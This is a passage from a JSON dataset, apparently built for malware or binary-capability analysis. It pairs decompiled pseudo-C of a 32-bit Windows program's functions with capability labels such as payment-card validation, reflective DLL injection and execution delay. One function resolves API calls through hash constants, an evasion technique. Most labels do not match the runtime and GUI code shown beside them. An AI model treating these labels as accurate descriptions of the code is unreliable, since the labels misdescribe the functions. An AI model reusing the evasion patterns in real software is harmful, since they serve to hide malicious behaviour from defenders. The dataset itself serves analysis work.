        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0040a671(uint arg_8h)\n\n{\n    uchar uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040c020();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = 0x1;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    extraout_ECX[4] = NULL;\n    uVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.std::locale::_Locimp.0;\n    *(extraout_ECX + 5) = uVar1;\n    fcn.0040886b(0x43aec4);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 259
    },
    "004010c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004010c8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    uchar auStack24 [24];\n    \n    fcn.0040122b();\n    if (param_2 != 0) {\n        *(param_1 + 0x14) = param_2;\n        iVar1 = (*_sym.imp.GDI32.dll_GetObjectA)(param_2, 0x18);\n        if (iVar1 == 0) {\n            fcn.0040122b();\n            return 0;\n        }\n        *(param_1 + 0xc) = auStack24;\n        *(param_1 + 0x10) = unaff_ESI;\n    }\n    return 1;\n}\n",
        "token_count": 177
    },
    "0040115e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040115e(int32_t **param_1)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    int32_t **ppiVar2;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x41f6d8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 0;\n    ppiVar2 = param_1;\n    cVar1 = fcn.00408de9();\n    if ((cVar1 == '\\0') && ((*(*(**param_1 + 4) + 0x10 + *param_1) & 2) != 0)) {\n        fcn.0040119a();\n    }\n    uStack4 = 0xffffffff;\n    if (*(*(**param_1 + 4) + 0x28 + *param_1) != 0) {\n        fcn.00408bc8(ppiVar2);\n    }\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 244
    },
    "00401221": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint fcn.00401221(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    char *pcStack136;\n    uint uStack132;\n    \n    uStack132 = 1;\n    pcStack136 = 0x405c8b;\n    uStack140 = fcn.0040124e();\n    pcStack136 = 0x683be220;\n    uStack144 = 0x405c96;\n    pcVar5 = fcn.0040100a();\n    uStack132 = 0x405c9b;\n    (*pcVar5)();\n    uStack132 = 0xffffff;\n    pcStack136 = \".\\\\splash.bmp\";\n    uStack140 = 0x405cae;\n    fcn.004011f4();\n    uStack140 = 0x405cb7;\n    fcn.004011ef();\n    uStack140 = 5000;\n    uStack144 = 0x405cc2;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    uStack144 = 0x405ccb;\n    fcn.004011ea();\n    uStack144 = 0x405cd4;\n    fcn.00401181();\n    uStack144 = 0x405cdd;\n    fcn.00401235();\n    pcVar5 = _sym.imp.USER32.dll_GetMessageA;\n    uStack144 = 0;\n    uStack148 = 0;\n    uStack152 = 0;\n    iVar6 = (*_sym.imp.USER32.dll_GetMessageA)();\n    pcVar4 = _sym.imp.USER32.dll_TranslateAcceleratorA;\n    pcVar3 = _sym.imp.USER32.dll_DispatchMessageA;\n    pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n    uVar1 = uStack144;\n    while (uStack144 = uVar1,  iVar6 != 0) {\n        iVar6 = (*pcVar4)(uStack152, 0, &stack0xffffff68);\n        if (iVar6 == 0) {\n            (*pcVar2)(&stack0xffffff5c);\n            (*pcVar3)(&stack0xffffff58);\n        }\n        iVar6 = (*pcVar5)(&stack0xffffff5c, 0, 0, 0);\n        uVar1 = uStack144;\n    }\n    fcn.00401127();\n    fcn.004011a4();\n    return uVar1;\n}\n",
        "token_count": 580
    },
    "0040123a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040123a(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uchar auStack64 [4];\n    uint uStack60;\n    uint uStack24;\n    \n    if (*(param_1 + 0x14) != 0) {\n        puStack100 = &stack0xffffffc0;\n        uStack104 = param_2;\n        puStack108 = 0x407eb0;\n        uVar1 = (*_sym.imp.USER32.dll_BeginPaint)();\n        uStack112 = *(param_1 + 4);\n        puStack108 = &stack0xffffffa8;\n        uStack116 = 0x407ec1;\n        (*_sym.imp.USER32.dll_GetClientRect)();\n        uStack120 = 0x407ec8;\n        uStack116 = uVar1;\n        uVar2 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)();\n        uStack120 = *(param_1 + 0x14);\n        uStack128 = 0x407ed5;\n        uStack124 = uVar2;\n        uStack24 = (*_sym.imp.GDI32.dll_SelectObject)();\n        uStack128 = 0xcc0020;\n        uStack132 = 0;\n        uStack136 = 0;\n        uStack140 = uVar2;\n        (*_sym.imp.GDI32.dll_BitBlt)(uVar1, 0, 0, *(param_1 + 0xc), *(param_1 + 0x10));\n        (*_sym.imp.GDI32.dll_SelectObject)(uVar2, uStack60);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar2);\n        (*_sym.imp.USER32.dll_EndPaint)(param_2, &stack0xffffff74);\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "0040124e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040124e(char param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uchar auStack40 [4];\n    uint32_t uStack36;\n    uint uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x41f738;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    iVar2 = fcn.0040121c();\n    piVar1 = *(*(iVar2 + 0xc) + 0xc);\n    piVar5 = piVar1;\n    if (param_1 != '\\0') {\n        iVar2 = piVar1[6];\n        *in_FS_OFFSET = uStack12;\n        return iVar2;\n    }\n    while( true ) {\n        iVar2 = fcn.004011a9(auStack40, 0x2a9, 0);\n        uStack4 = 0;\n        if (*(iVar2 + 0x18) < 8) {\n            iVar2 = iVar2 + 4;\n        }\n        else {\n            iVar2 = *(iVar2 + 4);\n        }\n        uVar3 = fcn.0040b718(piVar5[0xc], unaff_ESI, unaff_EBP);\n        iVar4 = fcn.004010f0(uVar3);\n        iVar2 = fcn.0040b685(iVar2);\n        uStack4 = 0xffffffff;\n        if (7 < uStack16) {\n            fcn.0040b0dd(uStack36);\n        }\n        uStack16 = 7;\n        uStack20 = 0;\n        uStack36 = uStack36 & 0xffff0000;\n        if (iVar4 == iVar2) break;\n        piVar5 = *piVar5;\n        if (piVar5 == piVar1) {\n            *in_FS_OFFSET = uStack12;\n            return 0;\n        }\n    }\n    iVar2 = piVar5[6];\n    *in_FS_OFFSET = uStack12;\n    return iVar2;\n}\n",
        "token_count": 531
    },
    "0040126c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.0040126c(int32_t **param_1, int32_t *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x41f698;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = param_2;\n    if (*(*(*param_2 + 4) + 0x28 + param_2) != 0) {\n        fcn.00408bbf();\n    }\n    uStack4 = 0;\n    if ((*(*(*param_2 + 4) + 8 + param_2) == 0) && (*(param_2 + *(*param_2 + 4) + 0x2c) != 0)) {\n        fcn.0040119a();\n    }\n    *(param_1 + 1) = *(*(*param_2 + 4) + 8 + param_2) == 0;\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 265
    },
    "00401271": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401271(uint param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = fcn.0040124e(0, 0x6fc49b7c);\n    pcVar2 = fcn.0040100a(uVar1);\n    (*pcVar2)(param_1, 0, 0);\n    return;\n}\n",
        "token_count": 89
    },
    "004097db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.004097db(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040c020();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x43ae8c;\n        extraout_ECX[1] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = 1;\n    }\n    uVar1 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + *(*extraout_ECX + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    fcn.0040978f(*(unaff_EBP + 8), uVar1);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 348
    },
    "00409a4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00409a4b(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    if (-*(param_1 + 0x14) - 1U <= param_2) {\n        fcn.00408d91();\n    }\n    if (param_2 != 0) {\n        iVar3 = *(param_1 + 0x14) + param_2;\n        cVar1 = fcn.00401145(iVar3, 0);\n        if (cVar1 != '\\0') {\n            if (*(param_1 + 0x18) < 0x10) {\n                iVar2 = param_1 + 4;\n            }\n            else {\n                iVar2 = *(param_1 + 4);\n            }\n            fcn.00408dee(*(param_1 + 0x14) + iVar2, param_2, unaff_retaddr);\n            fcn.004011e5(iVar3);\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 253
    },
    "0040a3d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a3d4(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x14) < arg_8h) {\n        fcn.00408cf6();\n    }\n    uVar1 = *(in_ECX + 0x14) - arg_8h;\n    if (uVar1 < arg_ch) {\n        arg_ch = uVar1;\n    }\n    if (arg_ch != 0) {\n        uVar1 = arg_14h;\n        if (arg_ch < arg_14h) {\n            uVar1 = arg_ch;\n        }\n        if (*(in_ECX + 0x18) < 0x10) {\n            iVar2 = in_ECX + 4;\n        }\n        else {\n            iVar2 = *(in_ECX + 4);\n        }\n        uVar1 = fcn.0040da60(iVar2 + arg_8h, arg_10h, uVar1);\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n    }\n    if (arg_ch < arg_14h) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = arg_ch != arg_14h;\n    }\n    return uVar1;\n}\n",
        "token_count": 330
    },
    "0040a57f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040a57f(uint arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    fcn.00401253(*in_ECX + 0x18, 0);\n    return arg_8h;\n}\n",
        "token_count": 80
    },
    "0040aa5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040aa5d(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43aee8, 0x1c);\n    uVar2 = fcn.0040db1e();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(uVar2);\n    iVar3 = fcn.0040db18();\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        uVar2 = fcn.0040db1e();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar2);\n        fcn.0040f088(0xc);\n        *(unaff_EBP + -0x1c) = 1;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.0040ef04();\n    *(unaff_EBP + -0x2c) = *(iVar3 + 4);\n    uVar2 = fcn.0040eed2();\n    *(unaff_EBP + -0x28) = uVar2;\n    iVar3 = fcn.0040b8de(0x200);\n    *(unaff_EBP + -0x24) = iVar3;\n    if (iVar3 == 0) {\n        uVar2 = fcn.0040e9fc();\n        *(unaff_EBP + -0x24) = uVar2;\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        arg_10h = 0x200;\n        uVar2 = fcn.0040e9fc();\n        fcn.0040bce0(*(unaff_EBP + -0x24), uVar2, arg_10h);\n        *(unaff_EBP + -0x20) = 1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040ab0b();\n    puVar1 = *(unaff_EBP + 8);\n    *puVar1 = *(unaff_EBP + -0x2c);\n    puVar1[1] = *(unaff_EBP + -0x28);\n    puVar1[2] = *(unaff_EBP + -0x24);\n    puVar1[3] = *(unaff_EBP + -0x20);\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 648
    },
    "0040ab28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ab28(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *arg_ch_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43aef8, 0xc);\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    if (arg_ch_00 == NULL) {\n        iVar1 = fcn.0040ef04();\n        iVar1 = *(iVar1 + 8);\n    }\n    else {\n        iVar1 = *arg_ch_00;\n    }\n    if (iVar1 != 0) {\n        uVar2 = fcn.0040db1e();\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(uVar2);\n        iVar1 = fcn.0040db18();\n        if (iVar1 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            uVar2 = fcn.0040db1e();\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar2);\n            fcn.0040f088(0xc);\n            *(unaff_EBP + -0x1c) = 1;\n        }\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0040a974(*(unaff_EBP + 8), arg_ch_00);\n        *(unaff_EBP + 8) = uVar2;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0040abb7();\n    }\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 417
    },
    "0040b0e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b0e2(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x0040b10b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 92
    },
    "0040b958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040b958(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "0040c711": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c711(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b008, 0x40);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = arg_10h_00;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x38) = *(arg_8h_00 + -4);\n    uVar1 = fcn.0040b3f7(unaff_EBP + -0x50, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x3c) = uVar1;\n    iVar2 = fcn.0040f262();\n    *(unaff_EBP + -0x40) = *(iVar2 + 0x7c);\n    iVar2 = fcn.0040f262();\n    *(unaff_EBP + -0x44) = *(iVar2 + 0x80);\n    iVar2 = fcn.0040f262();\n    *(iVar2 + 0x7c) = iVar3;\n    iVar3 = fcn.0040f262();\n    *(iVar3 + 0x80) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.0040b48c(arg_8h_00, *(unaff_EBP + 0x14), arg_10h_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -0x20) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040c866();\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 620
    },
    "0040d513": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d513(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.0040f0bc();\n    fcn.0040d9b2(*(unaff_EBP + 0x14));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0040d40c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040d555(0x43b0a8, noname_1, unaff_retaddr, arg_8h);\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 283
    },
    "0040d6ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d6ff(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b0e8, 0xc);\n    fcn.0040d9b2(*(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0040d670(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040d73e(0x43b0e8);\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 238
    },
    "0040d7fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040d7fd(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    \n    uVar1 = fcn.0041305d(*0x4431b4);\n    if (uVar1 < *0x4431b0 + (4 - *0x4431b4)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.00412eb0(*0x4431b4, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00412eb0(*0x4431b4, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x4431b0 = iVar2 + (*0x4431b0 - *0x4431b4 >> 2) * 4;\n        *0x4431b4 = iVar2;\n    }\n    **0x4431b0 = unaff_EDI;\n    *0x4431b0 = *0x4431b0 + 1;\n    return;\n}\n",
        "token_count": 294
    },
    "0040dcb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040dcb8(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (0 < param_2) {\n        puVar1 = &param_2;\n        iVar2 = param_2;\n        do {\n            puVar1 = puVar1 + 1;\n            fcn.00411ee0(param_1, *puVar1);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0040de41": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.0040de41(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    bVar1 = true;\n    if (*0x44177c == NULL) {\n        *0x44177c = fcn.0040b8de(0x351);\n        if (*0x44177c == NULL) {\n            return NULL;\n        }\n    }\n    **0x44177c = 0;\n    fcn.0040dcb8(*0x44177c, 3, *0x441784, 0x43b2f8, *0x441788);\n    puVar3 = 0x441788;\n    do {\n        fcn.00411ee0(*0x44177c, 0x43b2f4);\n        puVar4 = puVar3 + 3;\n        iVar2 = fcn.00411e40(*puVar3, *puVar4);\n        if (iVar2 != 0) {\n            bVar1 = false;\n        }\n        fcn.0040dcb8(*0x44177c, 3, puVar3[2], 0x43b2f8, *puVar4);\n        puVar3 = puVar4;\n    } while (puVar4 < 0x4417b8);\n    if (!bVar1) {\n        return *0x44177c;\n    }\n    fcn.0040cfb5(*0x44177c);\n    *0x44177c = NULL;\n    return *0x441794;\n}\n",
        "token_count": 360
    },
    "0040ef04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040ef04(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    return iVar1 + 0xc;\n}\n",
        "token_count": 83
    },
    "0040efe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040efe8(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b840, 8);\n    piVar1 = *(unaff_EBP + 8) * 8 + 0x4417c8;\n    if (*piVar1 == 0) {\n        arg_8h_00 = fcn.0040b8de(0x18);\n        if (arg_8h_00 == 0) {\n            puVar2 = fcn.0041296c();\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.0040f088(10);\n            *(unaff_EBP + -4) = 0;\n            if (*piVar1 == 0) {\n                iVar3 = fcn.004159e1(arg_8h_00, 4000);\n                if (iVar3 == 0) {\n                    fcn.0040cfb5(arg_8h_00);\n                    puVar2 = fcn.0041296c();\n                    *puVar2 = 0xc;\n                    fcn.0040b52a(unaff_EBP + -0x10, 0xffffffff);\n                    goto code_r0x0040f079;\n                }\n                *piVar1 = arg_8h_00;\n            }\n            else {\n                fcn.0040cfb5(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040f07f();\n        }\n    }\ncode_r0x0040f079:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 459
    },
    "0040f7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.0040f7f0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint32_t var_4h;\n    \n    if (arg_ch != 0xffff) {\n        if (arg_ch < 0x100) {\n            var_4h = *(*0x4417c4 + (arg_ch & 0xffff) * 2);\n            goto code_r0x0040f83c;\n        }\n        var_4h = in_ECX;\n        iVar1 = fcn.00416625(1, &arg_ch, 1, &var_4h, *(arg_8h + 4), *(arg_8h + 0x14), in_ECX, unaff_EBP, unaff_retaddr, \n                             arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                             in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                             in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, \n                             in_stack_0000003c);\n        if (iVar1 != 0) goto code_r0x0040f83c;\n    }\n    var_4h = 0;\ncode_r0x0040f83c:\n    return var_4h & 0xffff & arg_10h & 0xffff;\n}\n",
        "token_count": 507
    },
    "0040f847": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
